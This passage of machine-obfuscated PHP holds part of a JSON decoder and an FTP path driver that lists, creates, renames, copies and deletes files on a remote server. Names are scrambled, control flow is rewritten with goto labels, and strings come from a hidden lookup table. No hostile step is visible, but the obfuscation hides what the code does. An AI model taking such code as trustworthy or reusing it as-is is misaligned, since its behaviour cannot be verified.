$F¦í”Ãº¬‘ = substr($DÄ™òª¿ , 1, -1); $cÆÍ’•µò¯ = $BÂÈí®ŠßŠ[33]; $BÖ‹Î—‚Œ = strlen($F¦í”Ãº¬‘); for ($E×÷„ƒ‘¬ = 0; $E×÷„ƒ‘¬ < $BÖ‹Î—‚Œ; ++$E×÷„ƒ‘¬) { $eÂ¢ÅÜÊ¥ = substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 2); $Aõ¹Ì°ä×ğ = ord($F¦í”Ãº¬‘[$E×÷„ƒ‘¬]); switch (!0) { case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1851]: $cÆÍ’•µò¯ .= chr(8); ++$E×÷„ƒ‘¬; break; case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1485]: $cÆÍ’•µò¯ .= chr(9); ++$E×÷„ƒ‘¬; break; case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1483]: $cÆÍ’•µò¯ .= chr(10); ++$E×÷„ƒ‘¬; break; case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1852]: $cÆÍ’•µò¯ .= chr(12); ++$E×÷„ƒ‘¬; break; case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1484]: $cÆÍ’•µò¯ .= chr(13); ++$E×÷„ƒ‘¬; break; case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1259]: case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1864]: case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1478]: case $eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1480]: if ($C‰ÛÚ¦å÷Š == $BÂÈí®ŠßŠ[112] && $eÂ¢ÅÜÊ¥ != $BÂÈí®ŠßŠ[1864] || $C‰ÛÚ¦å÷Š == $BÂÈí®ŠßŠ[55] && $eÂ¢ÅÜÊ¥ != $BÂÈí®ŠßŠ[1259]) { $cÆÍ’•µò¯ .= $F¦í”Ãº¬‘[++$E×÷„ƒ‘¬]; } break; case preg_match($BÂÈí®ŠßŠ[1865], substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 6)): $EôÍ»åŠèò = chr(hexdec(substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬ + 2, 2))) . chr(hexdec(substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬ + 4, 2))); $cÆÍ’•µò¯ .= $this->utf162utf8($EôÍ»åŠèò); $E×÷„ƒ‘¬ += 5; break; case $Aõ¹Ì°ä×ğ >= 32 && $Aõ¹Ì°ä×ğ <= 127: $cÆÍ’•µò¯ .= $F¦í”Ãº¬‘[$E×÷„ƒ‘¬]; break; case ($Aõ¹Ì°ä×ğ & 224) == 192: $cÆÍ’•µò¯ .= substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 2); ++$E×÷„ƒ‘¬; break; case ($Aõ¹Ì°ä×ğ & 240) == 224: $cÆÍ’•µò¯ .= substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 3); $E×÷„ƒ‘¬ += 2; break; case ($Aõ¹Ì°ä×ğ & 248) == 240: $cÆÍ’•µò¯ .= substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 4); $E×÷„ƒ‘¬ += 3; break; case ($Aõ¹Ì°ä×ğ & 252) == 248: $cÆÍ’•µò¯ .= substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 5); $E×÷„ƒ‘¬ += 4; break; case ($Aõ¹Ì°ä×ğ & 254) == 252: $cÆÍ’•µò¯ .= substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 6); $E×÷„ƒ‘¬ += 5; break; } } return $cÆÍ’•µò¯; } elseif (preg_match($BÂÈí®ŠßŠ[1866], $DÄ™òª¿ ) || preg_match($BÂÈí®ŠßŠ[1867], $DÄ™òª¿ )) { goto DàŠöäöĞâ; Fó¶Š³Š´: $F¦í”Ãº¬‘ = $this->reduce_string($F¦í”Ãº¬‘); if ($F¦í”Ãº¬‘ == $BÂÈí®ŠßŠ[33]) { if (reset($bˆ¶æ“Üšœ) == SERVICES_JSON_IN_ARR) { return $CÂóßÉéÈ–; } else { return $E…˜Øİ‘‹; } } $BÖ‹Î—‚Œ = strlen($F¦í”Ãº¬‘); goto b¡ñÒ§åêÍ; DàŠöäöĞâ: if ($DÄ™òª¿ [0] == $BÂÈí®ŠßŠ[154]) { $bˆ¶æ“Üšœ = array(SERVICES_JSON_IN_ARR); $CÂóßÉéÈ– = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bˆ¶æ“Üšœ = array(SERVICES_JSON_IN_OBJ); $E…˜Øİ‘‹ = array(); } else { $bˆ¶æ“Üšœ = array(SERVICES_JSON_IN_OBJ); $E…˜Øİ‘‹ = new stdClass(); } } array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_SLICE, $BÂÈí®ŠßŠ[260] => 0, $BÂÈí®ŠßŠ[1869] => !1)); $F¦í”Ãº¬‘ = substr($DÄ™òª¿ , 1, -1); goto Fó¶Š³Š´; b¡ñÒ§åêÍ: for ($E×÷„ƒ‘¬ = 0; $E×÷„ƒ‘¬ <= $BÖ‹Î—‚Œ; ++$E×÷„ƒ‘¬) { $EÃ†¨³ò = end($bˆ¶æ“Üšœ); $eÂ¢ÅÜÊ¥ = substr($F¦í”Ãº¬‘, $E×÷„ƒ‘¬, 2); if ($E×÷„ƒ‘¬ == $BÖ‹Î—‚Œ || $F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[47] && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] == SERVICES_JSON_SLICE) { $e“ã¼ÎµÁÈ = substr($F¦í”Ãº¬‘, $EÃ†¨³ò[$BÂÈí®ŠßŠ[260]], $E×÷„ƒ‘¬ - $EÃ†¨³ò[$BÂÈí®ŠßŠ[260]]); array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_SLICE, $BÂÈí®ŠßŠ[260] => $E×÷„ƒ‘¬ + 1, $BÂÈí®ŠßŠ[1869] => !1)); if (reset($bˆ¶æ“Üšœ) == SERVICES_JSON_IN_ARR) { array_push($CÂóßÉéÈ–, $this->decode($e“ã¼ÎµÁÈ)); } elseif (reset($bˆ¶æ“Üšœ) == SERVICES_JSON_IN_OBJ) { $a‰ŸÂ»™»á = array(); if (preg_match($BÂÈí®ŠßŠ[1870], $e“ã¼ÎµÁÈ, $a‰ŸÂ»™»á)) { $dÚˆ“ä£±Ç = $this->decode($a‰ŸÂ»™»á[1]); $F¾˜¦ç»Œˆ = $this->decode($a‰ŸÂ»™»á[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E…˜Øİ‘‹[$dÚˆ“ä£±Ç] = $F¾˜¦ç»Œˆ; } else { $E…˜Øİ‘‹->{$dÚˆ“ä£±Ç} = $F¾˜¦ç»Œˆ; } } elseif (preg_match($BÂÈí®ŠßŠ[1871], $e“ã¼ÎµÁÈ, $a‰ŸÂ»™»á)) { $dÚˆ“ä£±Ç = $a‰ŸÂ»™»á[1]; $F¾˜¦ç»Œˆ = $this->decode($a‰ŸÂ»™»á[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E…˜Øİ‘‹[$dÚˆ“ä£±Ç] = $F¾˜¦ç»Œˆ; } else { $E…˜Øİ‘‹->{$dÚˆ“ä£±Ç} = $F¾˜¦ç»Œˆ; } } } } elseif (($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[112] || $F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[55]) && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] != SERVICES_JSON_IN_STR) { array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_IN_STR, $BÂÈí®ŠßŠ[260] => $E×÷„ƒ‘¬, $BÂÈí®ŠßŠ[1869] => $F¦í”Ãº¬‘[$E×÷„ƒ‘¬])); } elseif ($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $EÃ†¨³ò[$BÂÈí®ŠßŠ[1869]] && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] == SERVICES_JSON_IN_STR && (strlen(substr($F¦í”Ãº¬‘, 0, $E×÷„ƒ‘¬)) - strlen(rtrim(substr($F¦í”Ãº¬‘, 0, $E×÷„ƒ‘¬), $BÂÈí®ŠßŠ[94]))) % 2 != 1) { array_pop($bˆ¶æ“Üšœ); } elseif ($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[154] && in_array($EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_IN_ARR, $BÂÈí®ŠßŠ[260] => $E×÷„ƒ‘¬, $BÂÈí®ŠßŠ[1869] => !1)); } elseif ($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[468] && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] == SERVICES_JSON_IN_ARR) { array_pop($bˆ¶æ“Üšœ); } elseif ($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[1049] && in_array($EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_IN_OBJ, $BÂÈí®ŠßŠ[260] => $E×÷„ƒ‘¬, $BÂÈí®ŠßŠ[1869] => !1)); } elseif ($F¦í”Ãº¬‘[$E×÷„ƒ‘¬] == $BÂÈí®ŠßŠ[312] && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] == SERVICES_JSON_IN_OBJ) { array_pop($bˆ¶æ“Üšœ); } elseif ($eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1872] && in_array($EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bˆ¶æ“Üšœ, array($BÂÈí®ŠßŠ[1868] => SERVICES_JSON_IN_CMT, $BÂÈí®ŠßŠ[260] => $E×÷„ƒ‘¬, $BÂÈí®ŠßŠ[1869] => !1)); $E×÷„ƒ‘¬++; } elseif ($eÂ¢ÅÜÊ¥ == $BÂÈí®ŠßŠ[1873] && $EÃ†¨³ò[$BÂÈí®ŠßŠ[1868]] == SERVICES_JSON_IN_CMT) { array_pop($bˆ¶æ“Üšœ); $E×÷„ƒ‘¬++; for ($C©‰ÇÂÑ¼ = $EÃ†¨³ò[$BÂÈí®ŠßŠ[260]]; $C©‰ÇÂÑ¼ <= $E×÷„ƒ‘¬; ++$C©‰ÇÂÑ¼) { $F¦í”Ãº¬‘ = substr_replace($F¦í”Ãº¬‘, $BÂÈí®ŠßŠ[50], $C©‰ÇÂÑ¼, 1); } } } if (reset($bˆ¶æ“Üšœ) == SERVICES_JSON_IN_ARR) { return $CÂóßÉéÈ–; } elseif (reset($bˆ¶æ“Üšœ) == SERVICES_JSON_IN_OBJ) { return $E…˜Øİ‘‹; } goto fÚòÒÀø­ğ; fÚòÒÀø­ğ: } } } function isError($C³ƒŒåŞèç, $e¤ëŠçœÓÑ = null) { $EâÁŸ¥«¿ =& $_SERVER[¿õñ]; if (class_exists($EâÁŸ¥«¿[1874])) { return PEAR::isError($C³ƒŒåŞèç, $e¤ëŠçœÓÑ); } elseif (is_object($C³ƒŒåŞèç) && (get_class($C³ƒŒåŞèç) == $EâÁŸ¥«¿[1875] || is_subclass_of($C³ƒŒåŞèç, $EâÁŸ¥«¿[1875]))) { return !0; } return !1; } } goto EÏŠ£œÃ×’; cÍ„œÄ³İä: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($C‚îğåˆ¢”) { parent::__construct(); if (count($C‚îğåˆ¢”) > 0) { $this->_init($C‚îğåˆ¢”); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B¤¡±ò¬‰) { $BÚ´ÌßÜò =& $_SERVER[¿õñ]; global $config; $this->appCharset = $config[$BÚ´ÌßÜò[1120]]; $this->systemCharset = $config[$BÚ´ÌßÜò[1121]]; if (isset($B¤¡±ò¬‰[$BÚ´ÌßÜò[1122]]) && $B¤¡±ò¬‰[$BÚ´ÌßÜò[1122]]) { $this->systemCharset = $B¤¡±ò¬‰[$BÚ´ÌßÜò[1122]]; } } public function iconvApp($c šöáŠ¢¦) { return $this->iconvTo($c šöáŠ¢¦, $this->systemCharset, $this->appCharset); } public function iconvSystem($bØºÊ­ñœ) { return $this->iconvTo($bØºÊ­ñœ, $this->appCharset, $this->systemCharset); } public function getPathOuter($fšÈ§Ê®¦¸) { goto c¹øºÖİ¸; aˆæõŠÍ±: $fšÈ§Ê®¦¸ = KodIO::clear($fšÈ§Ê®¦¸); $fšÈ§Ê®¦¸ = substr($fšÈ§Ê®¦¸, strlen($fëòÂÇîš)); if (empty($this->pathDriver)) { return $fšÈ§Ê®¦¸; } goto fÛ”ñø¡; F‰À›è„ƒŠ: if (substr($fëòÂÇîš, 0, 2) == $E†ÃÓê‰ğ[1123]) { $fëòÂÇîš = BASIC_PATH . substr($fëòÂÇîš, 2); } if (substr($fšÈ§Ê®¦¸, 0, 2) == $E†ÃÓê‰ğ[1123]) { $fšÈ§Ê®¦¸ = BASIC_PATH . substr($fšÈ§Ê®¦¸, 2); } $fëòÂÇîš = KodIO::clear($fëòÂÇîš); goto aˆæõŠÍ±; fÛ”ñø¡: return $this->pathDriver . $E†ÃÓê‰ğ[8] . ltrim($fšÈ§Ê®¦¸, $E†ÃÓê‰ğ[8]); goto b¢çŸ½‡–; c¹øºÖİ¸: $E†ÃÓê‰ğ =& $_SERVER[¿õñ]; $fëòÂÇîš = $this->iconvApp($this->pathBase); $fšÈ§Ê®¦¸ = $this->iconvApp($fšÈ§Ê®¦¸); goto F‰À›è„ƒŠ; b¢çŸ½‡–: } private function _init($E¥áß¬è = array()) { goto b¹…Ä¯‡œÓ; CâäÄÁÔâŒ: if (isset($fê·õÖçòµ[$BÍì½Ñğ›Ñ])) { foreach ($fê·õÖçòµ[$BÍì½Ñğ›Ñ] as $c¸†÷À’µÈ => $fŠœåĞ™™) { $this->{$c¸†÷À’µÈ} = $fŠœåĞ™™; } return !0; } $D¾Œ‘éå£ = parse_url(trim($this->server, $FÛĞ™İƒ[8])); $this->host = $D¾Œ‘éå£[$FÛĞ™İƒ[166]]; goto dÆİ¹»‚×; EËÚ¥×ƒƒ«: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $fê·õÖçòµ[$BÍì½Ñğ›Ñ] = array($FÛĞ™İƒ[1129] => $this->connect, $FÛĞ™İƒ[166] => $this->host, $FÛĞ™İƒ[165] => $this->scheme, $FÛĞ™İƒ[167] => $this->port); goto fâ‚£ãÑìô; dÆİ¹»‚×: $e‰§ô´Ú—Í = isset($D¾Œ‘éå£[$FÛĞ™İƒ[165]]) && $D¾Œ‘éå£[$FÛĞ™İƒ[165]] == $FÛĞ™İƒ[1126] ? !0 : !1; $this->scheme = $e‰§ô´Ú—Í ? $FÛĞ™İƒ[1127] : $FÛĞ™İƒ[1128]; $this->port = isset($D¾Œ‘éå£[$FÛĞ™İƒ[167]]) ? $D¾Œ‘éå£[$FÛĞ™İƒ[167]] : 21; goto dÃºã˜ğ•Ä; dÃºã˜ğ•Ä: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $BöÌ´°èøÄ = @ftp_login($this->connect, $this->username, $this->userpass); goto EËÚ¥×ƒƒ«; fâ‚£ãÑìô: return $BöÌ´°èøÄ; goto A¢à•õ¸¢¹; Fˆ“Şéˆâ: foreach ($E¥áß¬è as $c¸†÷À’µÈ => $fŠœåĞ™™) { if (isset($this->{$c¸†÷À’µÈ})) { $this->{$c¸†÷À’µÈ} = $fŠœåĞ™™; } } static $fê·õÖçòµ = array(); $BÍì½Ñğ›Ñ = md5(json_encode($E¥áß¬è)); goto CâäÄÁÔâŒ; b¹…Ä¯‡œÓ: $FÛĞ™İƒ =& $_SERVER[¿õñ]; if (!function_exists($FÛĞ™İƒ[1124])) { show_json(LNG($FÛĞ™İƒ[1125]), !1); } $this->charsetReset($E¥áß¬è); goto Fˆ“Şéˆâ; A¢à•õ¸¢¹: } private function _isconn() { return is_resource($this->connect); } public function mkfile($fƒ½Èˆˆô, $b˜³‘÷Ó© = '', $eæÊ©Ã²Ò¼ = REPEAT_RENAME) { if ($this->setContent($fƒ½Èˆˆô, $b˜³‘÷Ó©)) { return $this->getPathOuter($fƒ½Èˆˆô); } return !1; } public function mkdir($cæ°ãìèá¥, $A¯«Ãä© = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $cæ°ãìèá¥ = $this->iconvSystem($cæ°ãìèá¥); if ($this->isFolder($cæ°ãìèá¥) || @ftp_mkdir($this->connect, $cæ°ãìèá¥)) { return $this->getPathOuter($cæ°ãìèá¥); } if (!$this->mkdir($this->pathFather($cæ°ãìèá¥))) { return !1; } if ($cæ°ãìèá¥ = @ftp_mkdir($this->connect, $cæ°ãìèá¥)) { return $this->getPathOuter($cæ°ãìèá¥); } return !1; } public function copyFile($dñôÖ×™ßĞ, $D‚ğöáĞô³) { goto F÷˜ƒ„‚ŒË; F÷˜ƒ„‚ŒË: if (!$this->_isconn()) { return !1; } $DäÊ¿éê£ = $this->pathThis($this->iconvSystem($dñôÖ×™ßĞ)); $BÖ×«˜–  = $this->tempFile($DäÊ¿éê£); goto e¼Ú İ˜‹; AˆôÕ‰ğ´: $this->tempFileRemve($BÖ×«˜– ); return $b›™Š¿ãôø; goto Cê„²¤…ç; e¼Ú İ˜‹: $fÒÓ—öÌÆÃ = $this->iconvApp($BÖ×«˜– ); $this->download($dñôÖ×™ßĞ, $fÒÓ—öÌÆÃ); $b›™Š¿ãôø = $this->upload($D‚ğöáĞô³, $fÒÓ—öÌÆÃ); goto AˆôÕ‰ğ´; Cê„²¤…ç: } public function moveFile($f‚ Ê…‰¥, $C°ä²ñÁ†É) { if (!$this->_isconn()) { return !1; } $f‚ Ê…‰¥ = $this->iconvSystem($f‚ Ê…‰¥); $C°ä²ñÁ†É = $this->iconvSystem($C°ä²ñÁ†É); $Eè—‘Ì¬¦§ = @ftp_rename($this->connect, $f‚ Ê…‰¥, $C°ä²ñÁ†É); return $Eè—‘Ì¬¦§ ? $this->getPathOuter($C°ä²ñÁ†É) : !1; } public function delFile($aÚøÈÃæ°í) { if (!$this->_isconn()) { return !1; } $aÚøÈÃæ°í = $this->iconvSystem($aÚøÈÃæ°í); return @ftp_delete($this->connect, $aÚøÈÃæ°í); } public function delFolder($eá¹Îù–æ¶) { if (!$this->_isconn()) { return !1; } $eá¹Îù–æ¶ = $this->iconvSystem($eá¹Îù–æ¶); $CÜñ‚õø¤Í = $this->ftpList($eá¹Îù–æ¶); if (!$CÜñ‚õø¤Í) { return @ftp_rmdir($this->connect, $eá¹Îù–æ¶); } foreach ($CÜñ‚õø¤Í as $cí †¬Ëõë) { if ($this->isFolder($cí †¬Ëõë)) { $cí †¬Ëõë = $this->iconvApp($cí †¬Ëõë); $this->delFolder($cí †¬Ëõë); } else { @ftp_delete($this->connect, $cí †¬Ëõë); } } return @ftp_rmdir($this->connect, $eá¹Îù–æ¶); } public function rename($D¦½‚èøßÉ, $c¾éºÌæ) { goto fã÷…‹â¸Ô; c†®Ô³Å©Œ: $B÷¦½Å²•” = rtrim($c¨à¨·¤óµ, $d³èòóïÇ“[8]) . $d³èòóïÇ“[8] . $dã×®‘Ò„ ; $B§ŸŠ§ŞÀ = @ftp_rename($this->connect, $D¦½‚èøßÉ, $B÷¦½Å²•”); $B÷¦½Å²•” = $this->iconvApp($B÷¦½Å²•”); goto D„™°—ÚöŒ; C•“•ë“å¼: $dã×®‘Ò„  = $this->iconvSystem($dã×®‘Ò„ ); $D¦½‚èøßÉ = $this->iconvSystem($D¦½‚èøßÉ); $c¨à¨·¤óµ = $this->pathFather($D¦½‚èøßÉ); goto c†®Ô³Å©Œ; D„™°—ÚöŒ: return $B§ŸŠ§ŞÀ ? $this->getPathOuter($B÷¦½Å²•”) : !1; goto E¾ğåí¸°; fã÷…‹â¸Ô: $d³èòóïÇ“ =& $_SERVER[¿õñ]; if (!$this->_isconn()) { return !1; } $dã×®‘Ò„  = $this->fileNameAuto($this->pathFather($D¦½‚èøßÉ), $c¾éºÌæ); goto C•“•ë“å¼; E¾ğåí¸°: } private function folderInfo($B®ÁÇ·¦, $f†‘¡¾İ» = false) { goto CÂæ­íù±î; Dì¾ó»¸Ää: return $Eİ¶±‡Ø ; goto fœ¿Ã½š¢â; aâÑÉœ¬‘: $c¯²ÛÑƒ‡ = $this->iconvSystem($B®ÁÇ·¦); if ($f†‘¡¾İ») { return array($aˆŠ¥Ü¥†”[28] => $bíï¦Û¨î—, $aˆŠ¥Ü¥†”[76] => $CÜ…†¬¾Œ×, $aˆŠ¥Ü¥†”[29] => $aˆŠ¥Ü¥†”[77]); } $Eİ¶±‡Ø  = array($aˆŠ¥Ü¥†”[28] => $bíï¦Û¨î—, $aˆŠ¥Ü¥†”[76] => $CÜ…†¬¾Œ×, $aˆŠ¥Ü¥†”[29] => $aˆŠ¥Ü¥†”[77], $aˆŠ¥Ü¥†”[184] => $aˆŠ¥Ü¥†”[50], $aˆŠ¥Ü¥†”[106] => $aˆŠ¥Ü¥†”[50], $aˆŠ¥Ü¥†”[1130] => !0, $aˆŠ¥Ü¥†”[1131] => !0); goto Dì¾ó»¸Ää; CÂæ­íù±î: $aˆŠ¥Ü¥†” =& $_SERVER[¿õñ]; $CÜ…†¬¾Œ× = $this->getPathOuter(rtrim($B®ÁÇ·¦, $aˆŠ¥Ü¥†”[8])); $bíï¦Û¨î— = $this->pathThis($CÜ…†¬¾Œ×); goto aâÑÉœ¬‘; fœ¿Ã½š¢â: } private function fileInfo($DÖï†’í‚‰, $F‰²³©ÚÇ½ = false) { goto b…µèëÎÀ„; céÇç‚º¸½: $FÛ­Ä®•¾„ = $this->iconvSystem($DÖï†’í‚‰); if ($F‰²³©ÚÇ½) { return array($e¨©¢–áí[28] => $Fóé…ßµİ, $e¨©¢–áí[76] => $d›§Öâ„‡±, $e¨©¢–áí[29] => $e¨©¢–áí[164], $e¨©¢–áí[157] => $this->ext($DÖï†’í‚‰), $e¨©¢–áí[78] => $this->size($DÖï†’í‚‰)); } $D™£ŠÔÎ· = array($e¨©¢–áí[28] => $Fóé…ßµİ, $e¨©¢–áí[76] => $d›§Öâ„‡±, $e¨©¢–áí[29] => $e¨©¢–áí[164], $e¨©¢–áí[184] => $e¨©¢–áí[50], $e¨©¢–áí[106] => @ftp_mdtm($this->connect, $FÛ­Ä®•¾„), $e¨©¢–áí[157] => $this->ext($DÖï†’í‚‰), $e¨©¢–áí[78] => $this->size($DÖï†’í‚‰), $e¨©¢–áí[1130] => !0, $e¨©¢–áí[1131] => !0); goto añÓˆ„İ´Ö; b…µèëÎÀ„: $e¨©¢–áí =& $_SERVER[¿õñ]; $d›§Öâ„‡± = $this->getPathOuter(rtrim($DÖï†’í‚‰, $e¨©¢–áí[8])); $Fóé…ßµİ = $this->pathThis($d›§Öâ„‡±); goto céÇç‚º¸½; añÓˆ„İ´Ö: $D™£ŠÔÎ·[$e¨©¢–áí[106]] = $D™£ŠÔÎ·[$e¨©¢–áí[106]] > 0 ? $D™£ŠÔÎ·[$e¨©¢–áí[106]] : $e¨©¢–áí[50]; return $D™£ŠÔÎ·; goto F•¾âÄ®¯â; F•¾âÄ®¯â: } public function size($BÁªßùî…) { $c›¿µÑÓñ = $this->objectMeta($BÁªßùî…); return $c›¿µÑÓñ ? $c›¿µÑÓñ[$_SERVER[¿õñ][78]] : 0; } public function info($cÉ£ÁÀ»¶ù) { if ($this->isFile($cÉ£ÁÀ»¶ù)) { return $this->fileInfo($cÉ£ÁÀ»¶ù, 0); } else { if ($this->isFolder($cÉ£ÁÀ»¶ù)) { return $this->folderInfo($cÉ£ÁÀ»¶ù); } } return !1; } public function exist($eÅŞó«Ö÷ï) { return $this->objectMeta($eÅŞó«Ö÷ï) ? !0 : !1; } public function isFile($e´œ­ºƒò) { $bßÃÛ¬ÁÓ =& $_SERVER[¿õñ]; $BİÉÎÈñ÷Ğ = $this->objectMeta($e´œ­ºƒò); return $BİÉÎÈñ÷Ğ ? $BİÉÎÈñ÷Ğ[$bßÃÛ¬ÁÓ[29]] == $bßÃÛ¬ÁÓ[164] : !1; } public function isFolder($f„øó…î) { $Dˆ¤Š¢¸Íª =& $_SERVER[¿õñ]; $c®…ÓÚ½Ó = $this->objectMeta($f„øó…î); return $c®…ÓÚ½Ó ? $c®…ÓÚ½Ó[$Dˆ¤Š¢¸Íª[29]] == $Dˆ¤Š¢¸Íª[77] : !1; } public function listPath($A›‡ÛïÉ‘Í, $f‡ÂµŠ‘‰ = false) { goto e±‡âÜ®‰Ÿ; d×Ä›«×òÃ: $F¯˜Ü•Ä¨ = $this->ftpList($A›‡ÛïÉ‘Í); $a®²‘éĞØ× = array($cñ®„Ó×½[75] => array(), $cñ®„Ó×½[74] => array()); if (!$F¯˜Ü•Ä¨) { return $a®²‘éĞØ×; } goto FÉÆ°ˆÚéŒ; FÉÆ°ˆÚéŒ: foreach ($F¯˜Ü•Ä¨ as $A›‡ÛïÉ‘Í) { if ($this->isFolder($A›‡ÛïÉ‘Í)) { $a®²‘éĞØ×[$cñ®„Ó×½[75]][] = $this->folderInfo($A›‡ÛïÉ‘Í, $f‡ÂµŠ‘‰); } else { $a®²‘éĞØ×[$cñ®„Ó×½[74]][] = $this->fileInfo($A›‡ÛïÉ‘Í, $f‡ÂµŠ‘‰); } } return $a®²‘éĞØ×; goto eµÔ½¬†‹À; e±‡âÜ®‰Ÿ: $cñ®„Ó×½ =& $_SERVER[¿õñ]; if (!$this->_isconn()) { return !1; } $A›‡ÛïÉ‘Í = $this->iconvSystem($A›‡ÛïÉ‘Í); goto d×Ä›«×òÃ; eµÔ½¬†‹À: } public function has($eÓàçºœÈ, $EôÏ„ŒØƒ = false, $bäÛø”¡Ù = true) { goto C¾©öæ¹˜; C¾©öæ¹˜: $E¦¦¶ÛÌà§ =& $_SERVER[¿õñ]; if (!$this->_isconn()) { return !1; } $eÓàçºœÈ = $this->iconvSystem($eÓàçºœÈ); goto Dâ‰Øª¼Š„; BƒÌ±¬‰¯Ú: foreach ($D¹éƒ±í‡ as $eÓàçºœÈ) { if ($bäÛø”¡Ù) { if (!$this->isFolder($eÓàçºœÈ)) { return !0; } } else { if ($this->isFolder($eÓàçºœÈ)) { return !0; } } } return !1; goto côÈ½Í¢ãŠ; Dâ‰Øª¼Š„: $D¹éƒ±í‡ = $this->ftpList($eÓàçºœÈ); if (!$D¹éƒ±í‡) { return !1; } if ($EôÏ„ŒØƒ) { return array($E¦¦¶ÛÌà§[188] => 0, $E¦¦¶ÛÌà§[189] => count($D¹éƒ±í‡)); } goto BƒÌ±¬‰¯Ú; côÈ½Í¢ãŠ: } public function listAll($f¯•ëŸŠÂÚ) { goto BÃÃËØ‡Ò; FÔ’ò“…Œç: foreach ($E²¦–Íâä[$a´î¬¡»Ë[75]] as $fö¾¤™¾¡—) { $aÓäÉåµêà[] = array($a´î¬¡»Ë[76] => $a´î¬¡»Ë[8] . trim(str_replace($f¯•ëŸŠÂÚ, $a´î¬¡»Ë[33], $fö¾¤™¾¡—), $a´î¬¡»Ë[8]) . $a´î¬¡»Ë[8], $a´î¬¡»Ë[77] => 1, $a´î¬¡»Ë[78] => 0); } foreach ($E²¦–Íâä[$a´î¬¡»Ë[74]] as $a×æÉÛ¾ğˆ) { $aÓäÉåµêà[] = array($a´î¬¡»Ë[76] => $a´î¬¡»Ë[8] . trim(str_replace($f¯•ëŸŠÂÚ, $a´î¬¡»Ë[33], $a×æÉÛ¾ğˆ), $a´î¬¡»Ë[8]), $a´î¬¡»Ë[77] => 0, $a´î¬¡»Ë[78] => $this->size($a×æÉÛ¾ğˆ)); } return $aÓäÉåµêà; goto Fç­ÇÄ¶ï; BÃÃËØ‡Ò: $a´î¬¡»Ë =& $_SERVER[¿õñ]; if (!$this->_isconn()) { return !1; } $f¯•ëŸŠÂÚ = $this->iconvSystem($f¯•ëŸŠÂÚ); goto còŒ¹Ê‘ ; còŒ¹Ê‘ : $E²¦–Íâä = array($a´î¬¡»Ë[74] => array(), $a´î¬¡»Ë[75] => array()); $this->recursionFtpFiles($f¯•ëŸŠÂÚ, $E²¦–Íâä); $aÓäÉåµêà = array(); goto FÔ’ò“…Œç; Fç­ÇÄ¶ï: } public function getContent($C» æç…±—) { if (!$this->_isconn()) { return !1; } $C» æç…±— = $this->iconvSystem($C» æç…±—); return $this->fileSubstr($C» æç…±—); } public function setContent($fòÛ±ÀŠ·†, $E¶ÁÃĞÁËõ = '') { goto fÇéà®´Œ; fÇéà®´Œ: if (!$this->_isconn()) { return !1; } $A„¤¥µ•âæ = $this->pathThis($this->iconvSystem($fòÛ±ÀŠ·†)); $aÉŸßÙÄĞÁ = $this->tempFile($A„¤¥µ•âæ); goto e¤ôéñ„ë; e¤ôéñ„ë: 